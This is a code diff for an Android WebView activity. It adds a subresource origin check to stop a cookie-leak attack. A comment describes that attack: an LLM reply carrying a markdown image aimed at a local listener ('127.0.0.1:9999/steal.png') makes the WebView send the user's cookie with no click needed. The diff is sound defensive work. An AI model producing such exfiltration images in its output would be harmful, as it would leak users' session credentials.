@@ -35,6 +35,7 @@ import androidx.activity.OnBackPressedCallback
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.lifecycleScope
 import androidx.lifecycle.repeatOnLifecycle
+import com.dsh.core.subresourceOriginAllowed
 import com.dsh.core.DshInstances
 import com.dsh.core.DshLogBus
 import com.dsh.core.DshRuntime
@@ -520,6 +521,36 @@ class DshWebViewActivity : FCLActivity() {
                 // 失败也返回 true：不能让页面自己在 WebView 里导航到站外（那会顶掉 dsh 界面），
                 // 与既有行为一致（fix9 之前同样无条件 true）；用户侧至少有一条日志可查。
                 return true
+            }
+
+            /**
+             * ★ R49/S-01 补（R2-SECURITY §1.4）：**子资源**的 origin 门。
+             *
+             * `shouldOverrideUrlLoading` 只管导航，**子资源不走它** —— 所以 S-01 修好的
+             * 端口门对 `<img>` / `<script>` / `fetch` 完全无效。
+             *
+             * 而出货前端真的会渲染远程图片（`<img src={e} loading="lazy">`，
+             * `src` 没有 host/port 限制），出货 `index.html` 也没有 CSP。
+             * 于是：rootfs 内进程在 `127.0.0.1:9999` 起个监听 + LLM 回复里带
+             * `![](http://127.0.0.1:9999/steal.png)` ⇒ WebView 发起子资源请求 ⇒
+             * **cookie 照带**（按 host 存、不含端口）⇒ 零点击泄漏。
+             *
+             * 判据在 [subresourceOriginAllowed]（纯函数、有真值表单测）。
+             * 这里只做两件事：取当前页 URL + 把拒绝落成空响应。
+             */
+            override fun shouldInterceptRequest(
+                view: WebView?,
+                request: WebResourceRequest?
+            ): WebResourceResponse? {
+                val url = request?.url?.toString() ?: return null
+                val pageUrl = runCatching { view?.url }.getOrNull()
+                if (subresourceOriginAllowed(url, pageUrl, expectedWebUiPort())) return null
+                // ★ 返回非 null = "我来提供这个响应"，WebView 不再发真实请求 ⇒
+                //   cookie 不会出去。空 200 + 空体让页面自己走 onError 分支（前端已有
+                //   `onError: () => setBroken(true)`，会显示 alt 文本而不是崩掉）。
+                logWeb("[web] subresource blocked (origin not allowed): " + urlSkeleton(url))
+                return WebResourceResponse("text/plain", "utf-8", 200, "OK",
+                    emptyMap(), java.io.ByteArrayInputStream(ByteArray(0)))
             }
 
             override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
